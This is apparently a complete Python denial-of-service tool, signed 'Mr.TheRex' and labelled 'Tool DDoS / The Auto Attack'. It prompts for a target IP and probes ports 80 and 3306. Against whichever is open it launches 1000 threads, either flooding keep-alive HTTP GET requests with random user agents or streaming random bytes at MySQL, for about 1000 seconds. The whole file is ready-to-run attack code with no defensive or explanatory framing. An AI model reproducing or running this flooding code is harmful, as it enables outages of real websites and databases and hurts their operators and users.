import socket
import time
import random
import threading
from threading import Thread

Z = '\033[1;31m'  # أحمر
X = '\033[1;33m'  # أصفر
F = '\033[2;32m'  # أخضر
C = "\033[1;97m"  # أبيض
B = '\033[2;36m'  # سماوي
Y = '\033[1;34m'  # أزرق فاتح
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'

print(f"                 {Y}By Mr.TheRex {Z} Tool DDoS")
print(f"          The Auto Attack       ")
print(f"{S}    ————————————————————————————————————————")
print()

ip_wy = input(f"{B} Friend Join: ")

ports = {80: "HTTP", 3306: "MySQL"}

def check_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            print(f"{G}Port {port} ({ports[port]}) is open. Starting attack...")
            return True
        else:
            print(f"{Z}Port {port} ({ports[port]}) is closed.")
            return False
    except Exception as e:
        print(f"{E}Error checking port {port}: {e}")
        return False
    finally:
        sock.close()

def http(ip):
    floodtime = time.time() + 1000
    while time.time() < floodtime:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            try:
                sock.connect((ip, 80))
                while time.time() < floodtime:
                    sock.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(UAlist())}\r\nConnection: keep-alive\r\n\r\n'.encode())
            except:
                sock.close()

def tcp(ip, port):
    floodtime = time.time() + 1000
    while time.time() < floodtime:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            try:
                sock.connect((ip, port))
                while time.time() < floodtime:
                    sock.send(random._urandom(1024))
            except:
                pass

def UAlist():
    return [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Podcasts/1650.20 CFNetwork/1333.0.4 Darwin/21.5.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1",
        "AppleCoreMedia/1.0.0.19F77 (iPhone; U; CPU OS 15_5 like Mac OS X; nl_nl)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "bbos",
        "urmom",
        "xd",
        "null"
    ]

for port, protocol in ports.items():
    if check_port(ip_wy, port):
        if protocol == "HTTP":
            for _ in range(1000):
                Thread(target=http, args=(str(ip_wy),)).start()
        elif protocol == "MySQL":
            for _ in range(1000):
                Thread(target=tcp, args=(str(ip_wy), port)).start()